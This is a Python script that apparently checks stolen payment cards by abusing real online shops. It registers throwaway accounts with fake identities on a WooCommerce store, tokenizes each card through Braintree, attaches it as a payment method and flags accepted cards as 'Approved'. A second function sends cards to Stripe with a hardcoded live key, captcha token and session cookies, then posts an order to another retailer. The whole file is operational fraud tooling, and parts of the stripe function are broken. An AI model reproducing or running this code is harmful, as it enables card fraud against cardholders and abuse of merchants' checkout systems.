import os

try:
    import pyfiglet, webbrowser, user_agent, time
    import requests
    import re
    import base64
    import random
    import string
    
except ImportError as e:
    print("حدث خطأ في استدعاء مكتبة:", e)
    print("يتم تثبيت المكتبات...")
    os.system('pip install pyfiglet user_agent requests')
    import pyfiglet
    import webbrowser
    import user_agent
    import time
    import requests
    import re
    import base64
    import random
    import string
    import requests


def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
		
	user = user_agent.generate_user_agent()
		
	r = requests.session()
	
	r.follow_redirects = True
	
	r.verify = False


		
	def generate_full_name():
				first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
			                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
			                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
			                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
			                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
			                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
			                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
			                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
			                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
			                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] # List of first names
			    
				last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
			                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
			                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
			                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
			                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
			                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
			                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
			                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] # List of last names
			    
				full_name = random.choice(first_names) + " " + random.choice(last_names)
				first_name, last_name = full_name.split()

				return first_name, last_name
			
	def generate_address():
		cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
		states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
		streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
		zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]

		city = random.choice(cities)
		state = states[cities.index(city)]
		street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
		zip_code = zip_codes[states.index(state)]

		return city, state, street_address, zip_code
			
			# Testing the library:
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
			
			
			
			
			
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
				
		return f"{name}{number}@gmail.com"
	acc = (generate_random_account())
			
		
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
				
		return f"{name}{number}"
	username = (username())
			
			
			
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())
			
			
	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
			
	corr = generate_random_code()
			
	sess = generate_random_code()
			
		
	
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'cache-control': 'no-cache',
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
	
	response = r.get('https://forfullflavor.com/my-account/', headers=headers)
	
	
	
	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
	
	
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
	
	data = {
	    'username': username,
	    'email': acc,
	    'woocommerce-register-nonce': register,
	    '_wp_http_referer': '/my-account/',
	    'register': 'Register',
	}
	
	response = r.post('https://forfullflavor.com/my-account/', headers=headers, data=data)
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'cache-control': 'no-cache',
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
	
	response = r.get('https://forfullflavor.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
	
	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
	
	data = {
	    'billing_first_name': first_name,
	    'billing_last_name': last_name,
	    'billing_company': '',
	    'billing_country': 'US',
	    'billing_address_1': street_address,
	    'billing_address_2': '',
	    'billing_city': city,
	    'billing_state': state,
	    'billing_postcode': zip_code,
	    'billing_phone': num,
	    'billing_email': acc,
	    'save_address': 'Save address',
	    'woocommerce-edit-address-nonce': address,
	    '_wp_http_referer': '/my-account/edit-address/billing/',
	    'action': 'edit_address',
	}
	
	response = r.post('https://forfullflavor.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
	
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'cache-control': 'no-cache',
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
	
	response = r.get('https://forfullflavor.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	
	client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
	
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
		
	data = {
		    'action': 'wc_braintree_credit_card_get_client_token',
		    'nonce': client,
	}
		
	response = r.post('https://forfullflavor.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
	
	enc = response.json()['data']
	
	dec = base64.b64decode(enc).decode('utf-8')
	
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	
	
		
	headers = {
		    'authority': 'payments.braintree-api.com',
		    'accept': '*/*',
		    'authorization': f'Bearer {au}',
		    'braintree-version': '2018-05-10',
		    'cache-control': 'no-cache',
		    'content-type': 'application/json',
		    'pragma': 'no-cache',
		    'user-agent': user,
		}
		
	json_data = {
		    'clientSdkMetadata': {
		        'source': 'client',
		        'integration': 'custom',
		        'sessionId': '9c8cc072-4588-4af4-b73e-a4f0d2af84e4',
		    },
		    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
		    'variables': {
		        'input': {
		            'creditCard': {
		                'number': n,
		                'expirationMonth': mm,
		                'expirationYear': yy,
		                'cvv': cvc,
		            },
		            'options': {
		                'validate': False,
		            },
		        },
		    },
		    'operationName': 'TokenizeCreditCard',
		}
		
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		
	
	try:
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		return
		
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
		
	data = {
		    'payment_method': 'braintree_credit_card',
		    'wc-braintree-credit-card-card-type': 'master-card',
		    'wc-braintree-credit-card-3d-secure-enabled': '',
		    'wc-braintree-credit-card-3d-secure-verified': '',
		    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
		    'wc_braintree_credit_card_payment_nonce': tok,
		    'wc_braintree_device_data': '',
		    'wc-braintree-credit-card-tokenize-payment-method': 'true',
		    'woocommerce-add-payment-method-nonce': add_nonce,
		    '_wp_http_referer': '/my-account/add-payment-method/',
		    'woocommerce_add_payment_method': '1',
		}
		
	response = r.post('https://forfullflavor.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
				
			
		
		
		
	text = response.text
		
	pattern = r'Status code (.*?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
	
	if 'funds' in result or 'added' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
			return 'Approved'
	else:
		return result
def sq(card):
	return 'Your card was declined.'
	
#Strip CH	
	
def stripe(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data =f'guid=3ed77a95-299c-4fcf-b21e-122e3c0b916d88e207&muid=399f7c79-5247-4438-8a8f-7f37a563adfbf8b78c&sid=826c4c79-59f1-4bb8-af0d-ab610d671120726d2d&referrer=https%3A%2F%2Fprepsportswear.com&time_on_page=279553&card[name]=Merk+Bot&card[address_line1]=8384+White+Oak+Dr&card[address_line2]=&card[address_city]=Fort+Lauderdale&card[address_state]=UT&card[address_zip]=35862&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&email=hab959ddddddddddd%40gmail.com&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYoA5rlMARry1L66MUotXJmnPUa-pGT116B62ntv6X8MuTHXMWPN7IJJistvRpc5UDrfNjbOJv-4VrCPMKvsnNGkvl38BAUEKSsDbXDm9S20ArAChLvL5YCgmNuyHKoJNdeH5qwuo-ltRVncfipRm9gdTVwWufDYIUrwHb9hNmubtNfWhoW8xPgVbwozErlLKIjYkVVQMNpjzygl_-zA5XYDkybQ8Z_moRZOx3Zut_5zYngS7HaQ1KckA0ejD6Fkaumd4VUnP4oL2VaCkcDzSEpTFfNBKVDgTgguksI0vobWb8ke2_4ExF7tCqWHqQOeEpG2eWHYIAgo7Z8lI0jfllp9Zi3Rfnp6fLuNVMcWP1y9Riw-A0Ygf0pJYDpdRRPuurkPdR6NlS5yhBts2YOXtVKJkL7RmLOVZAtHvm9nQau7uxjXtq_Tu_ZyVZJevmdA6sz5Smn5ZRW_a8UYerwBGlvh8h452DdYqi9ZT_xzkaQLFv6K9FoWPMjd5pg_lKsz1kMZQ5mEmCSX768xTo2emtV643DIUSQ00VlsFSiWp4u9ONF5YHjgKQ4vDVzLf1Fs4LmpKsgUJGQsx5ezWbW3QVPJpIQMnqW-8-nnPxepHnJxvV9L4HWZcnXtBbsBsgIjwFYTSXGXwUsxwa9NDF6vp00CC9Jrtk9v7bUPlt0m3Csi6y7YL4RUyArRpPlH8fwgkz-9A2kgDWuJldVAVlGn7uMSZYU87LmpeRvAHQ5nOWCaq9ESTtIGhSKcKsOr4CPqeXlJOzclXkNkmt-ApdeoJO_8qhjtqYe_TjSXT_cgUh8z6dJTqgIFWsV7_69j5gsPCDRiEFDkMl69f_EU2A1mx8iNJy3sFejoYp2CFVahg2u-SHZEYYNC-BRUV01C-cKNwTBoqlOjiEYz692ficj41XxOAi8xFvEWLn7h40xPYlsKoR8nMEfrevsI4nHUfOwGtgDFxYl1iKVbVw-v0k2cREZv6zj09jxQtkCGguo7tnjN6n8_poUG328QVsdGhQ1mjo2cDmRVynZZLtAotMwrYQCgjkhAPX9x-wK0TFb6GO9zFnzWqrkg6CIF6Q_7BZCXos_nisZ0EjYKeYXs4PfgVQQIBHuXapmSjQwBsKFldlhC152Hz-sPuR1kRbt1laZAjpyQPLL4eN2wj5fUOX5Ll-r-Rl3f_tXKzJ5ORiDMTtjgN32gP2Wt7sgKOV3YiDHobAzJ2pWw4eQO85OAeS8JJa_FQPZ_tdwOKmTozd1TuHqJsKDrDSFHmKQLroO_q4f2vlN3u_TheoN7OOPlGN9-0atqnXQklLhlxCm5crbQnaMkhGYgr_8e4N422V2ZXLl1sAH1Ef98zdJDMqenvlS55HpnyseB_mHNx_22dpmylCiIvJGjM-26IW_ajeVdnXf_PoiWY2lcfxf8O-Ff_Cx1bvLsmjnO1FAoAYAsSW34bQ7jTuie29E2YoYqhCZbvuNhR1xysGx8RgV5Roioaz4U-24Wz05lc4Ea9PGWmOWfNlOfxU9SWt9Sayb42J13L44GwEWvIDET8Rvx5uUL0V1eoM0ZsqKGSQTvXUZl-f3_VfHNUvZ4zn9zDXYFqKTajEi95N6PIpkLwni3jR_f5gC96ylynsvgNfRaryT2okhnmmRz29c-o4cbqDA7X3OlhP5d2WTlaiHsTeFiu1Z48IHyOsqMNbf5YxkhVbwJbu2FQe85jgRbno5v_7Sd9wKjccvnYC0_CEV9LhVmg-f32NO_fYanW2Y7ghd9b-KlF_DiYyyfBDTfb8FvgvbEOTdGaNB9bemlsEWaySCE1QHel8ua8UxV2b8YSVPFbS_zunAJiqVNY54wlFNVXNaZmBvo315KEdVQeTaG9X_7c-yBImdijIlJOw4YcAmi-3a-T0d7yYwap03XXa70GxtQ6oqArGewA5WrgKzhE0i0cmVohHPylnKRBI-40LrP4BtnmsMXHetNOyJ90LrQKIZgW9v13BOtpcbfTVLdwf51c_iqf3pRJR8H3m1UGM0hK2Vzp3c535h5ddZgKtaa0K4kqpmS58hNnw1HbeZMmrgyRQ7Db3j3LEvZmfHvJ2TuQ-2EIDcUkPiaVPd7jgG5ewqT6NleHDOZmhsSqhzaGFyZF9pZM4DMYNvomtyqDQ1Y2NkOTYzonBkAA.M8QjTV9mN5B4FeU4eA8fYWhhKkJLViy-tuCstq12VkY&payment_user_agent=stripe.js%2F8e2708f229%3B+stripe-js-v3%2F8e2708f229%3B+card-element&pasted_fields=number&key=pk_live_7xS0ogDNa9kobWGvCMA0pLsZ'

	reso = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	
	cookies = {
	    'guid': 'ca6667ac-86d2-4582-af91-194c9cf09e39',
	    'SERVER': 'ps-client',
	    '_gcl_au': '1.1.648029471.1718119113',
	    '_gid': 'GA1.2.1587660387.1718119113',
	    '__attentive_id': '1e0f4b3fdffd4f3a8e720c97a0091aac',
	    '_attn_': 'eyJ1Ijoie1wiY29cIjoxNzE4MTE5MTE0MjgyLFwidW9cIjoxNzE4MTE5MTE0MjgyLFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcIjFlMGY0YjNmZGZmZDRmM2E4ZTcyMGM5N2EwMDkxYWFjXCJ9In0=',
	    '__attentive_cco': '1718119114292',
	    '_clck': '4y4v6x%7C2%7Cfmj%7C0%7C1623',
	    'adsystem': 'direct%20hit',
	    'adkeyword': 'direct%20hit',
	    'longad': 'direct%20hit_direct%20hit',
	    '_fbp': 'fb.1.1718119114439.329340670467134561',
	    '__attentive_ss_referrer': 'ORGANIC',
	    '_cioanonid': 'afda63a8-9cf4-75e4-9c5e-dd1f70db9edf',
	    '__attentive_dv': '1',
	    '__stripe_mid': '399f7c79-5247-4438-8a8f-7f37a563adfbf8b78c',
	    '__stripe_sid': '826c4c79-59f1-4bb8-af0d-ab610d671120726d2d',
	    'comm100_visitorguid_10002809': '3c40008a-2748-4c7a-8d76-b6c3140aec55',
	    '_ga': 'GA1.2.1143127287.1718119113',
	    '_uetsid': 'de2eb990280511ef869a09f9292299c0',
	    '_uetvid': 'de2fab70280511efbfdec9ba01af880b',
	    'SchoolID': '3031',
	    'AuthCookie': 'EEFF47BEDEF83DACDD7EE8B0BC6A7874BD4E3EAF6D5A025780561608A4D7C71A8EE437EBFA3352567246D28717A631A25382E4D9836D9FEFF2A61DA01A8BA70775DA8ACF570D3FF9F99742E5091392D2A5C2D2D52D82B3ABFFDDEBEC0A3EDD2003FDC9292A81C72229DECF89A1DCFF652C5F2D22B7D76D8DDD3FF2E8156A35278CA50284B2D3C0078530837BED1AFD6147D5C23066A2B82EE69C27D11693392226075372C07C0B6F40137B3E86E20D6B63177492CEB72FCC665F7B81683B15BC5DFD0D51',
	    'ASP.NET_SessionId': '11mcs1obmidqezcblsrudyhg',
	    'up_ss': 'm',
	    'up_pp': '%7c34%7c2024',
	    'ls': '',
	    '_ga_YPDKWSWQEC': 'GS1.2.1718119114.1.1.1718119269.30.0.0',
	    '__attentive_pv': '17',
	    '_clsk': '1hc930t%7C1718119270381%7C17%7C1%7Cf.clarity.ms%2Fcollect',
	    'attntv_mstore_email': 'hab959ddddddddddd@gmail.com:0',
	    '_dd_s': 'rum=0&expire=1718120309446',
	    '_ga_8C9SQ2XVB0': 'GS1.1.1718119113.1.1.1718119409.30.0.0',
}

	headers = {
	    'Accept': '*/*',
	    'Accept-Language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/json',
	    # 'Cookie': 'guid=ca6667ac-86d2-4582-af91-194c9cf09e39; SERVER=ps-client; _gcl_au=1.1.648029471.1718119113; _gid=GA1.2.1587660387.1718119113; __attentive_id=1e0f4b3fdffd4f3a8e720c97a0091aac; _attn_=eyJ1Ijoie1wiY29cIjoxNzE4MTE5MTE0MjgyLFwidW9cIjoxNzE4MTE5MTE0MjgyLFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcIjFlMGY0YjNmZGZmZDRmM2E4ZTcyMGM5N2EwMDkxYWFjXCJ9In0=; __attentive_cco=1718119114292; _clck=4y4v6x%7C2%7Cfmj%7C0%7C1623; adsystem=direct%20hit; adkeyword=direct%20hit; longad=direct%20hit_direct%20hit; _fbp=fb.1.1718119114439.329340670467134561; __attentive_ss_referrer=ORGANIC; _cioanonid=afda63a8-9cf4-75e4-9c5e-dd1f70db9edf; __attentive_dv=1; __stripe_mid=399f7c79-5247-4438-8a8f-7f37a563adfbf8b78c; __stripe_sid=826c4c79-59f1-4bb8-af0d-ab610d671120726d2d; comm100_visitorguid_10002809=3c40008a-2748-4c7a-8d76-b6c3140aec55; _ga=GA1.2.1143127287.1718119113; _uetsid=de2eb990280511ef869a09f9292299c0; _uetvid=de2fab70280511efbfdec9ba01af880b; SchoolID=3031; AuthCookie=EEFF47BEDEF83DACDD7EE8B0BC6A7874BD4E3EAF6D5A025780561608A4D7C71A8EE437EBFA3352567246D28717A631A25382E4D9836D9FEFF2A61DA01A8BA70775DA8ACF570D3FF9F99742E5091392D2A5C2D2D52D82B3ABFFDDEBEC0A3EDD2003FDC9292A81C72229DECF89A1DCFF652C5F2D22B7D76D8DDD3FF2E8156A35278CA50284B2D3C0078530837BED1AFD6147D5C23066A2B82EE69C27D11693392226075372C07C0B6F40137B3E86E20D6B63177492CEB72FCC665F7B81683B15BC5DFD0D51; ASP.NET_SessionId=11mcs1obmidqezcblsrudyhg; up_ss=m; up_pp=%7c34%7c2024; ls=; _ga_YPDKWSWQEC=GS1.2.1718119114.1.1.1718119269.30.0.0; __attentive_pv=17; _clsk=1hc930t%7C1718119270381%7C17%7C1%7Cf.clarity.ms%2Fcollect; attntv_mstore_email=hab959ddddddddddd@gmail.com:0; _dd_s=rum=0&expire=1718120309446; _ga_8C9SQ2XVB0=GS1.1.1718119113.1.1.1718119409.30.0.0',
	    'Origin': 'https://prepsportswear.com',
	    'Referer': 'https://prepsportswear.com/checkout/shippingandbilling',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
}
	json_data = {
	    'BillingCard': True,
	    'BillingCity': 'Fort Lauderdale',
	    'BillingCountry': 'United States',
	    'BillingEmailAddress': 'hab959ddddddddddd@gmail.com',
	    'BillingEmailAddressConfirm': 'hab959ddddddddddd@gmail.com',
	    'BillingFirstName': 'Merk',
	    'BillingLastName': 'Bot',
	    'BillingPhone': '543.837.9216x42446',
	    'BillingState': 'UT',
	    'BillingStreetAddress2': '',
	    'BillingStreetAddress': '8384 White Oak Dr',
	    'BillingZipCode': '35862',
	    'IsSubscription': False,
	    'IsSMSSubscription': True,
	    'SameAsShipping': True,
	    'ShippingCity': 'Fort Lauderdale',
	    'ShippingCountry': 'United States',
	    'ShippingFirstName': 'Merk',
	    'ShippingLastName': 'Bot',
	    'ShippingState': 'UT',
	    'ShippingStreetAddress2': '',
	    'ShippingStreetAddress': '8384 White Oak Dr',
	    'ShippingZipCode': '35862',
	    'StripeTokenId': f"{tok}",
}
	
	response = requests.post('https://prepsportswear.com/api/orders', params=params, cookies=cookies, headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"id":10486458,"address":"9350 N Central Expy","name":"yusuf","country":"US","vat":null,"billing_account_id":10486458,"last4":"9305","orderReference":"nljannd","user_id":11296645,"organization_id":10807386,"hours":0,"balance_increase_in_cents":null,"payment_method_id":"pm_1PLSN5KEzvleW5flaDzdyat6","transcription_id":null,"plan":"pro_2023_05_01","order_id":null,"recurrence_interval":"month","extra_plan_hours":null}'
#response = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, data=data)
	
	text = response.text
		
	pattern = r'Status code (.*?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
	
	if 'Success' in result or 'successfully' in result or 'thank you' in result or 'thanks' in result or 'approved' in result or 'fund' in result:
			return 'Approved'
	else:
		return result
def sq(card):
	return 'Your card was declined.'
	
	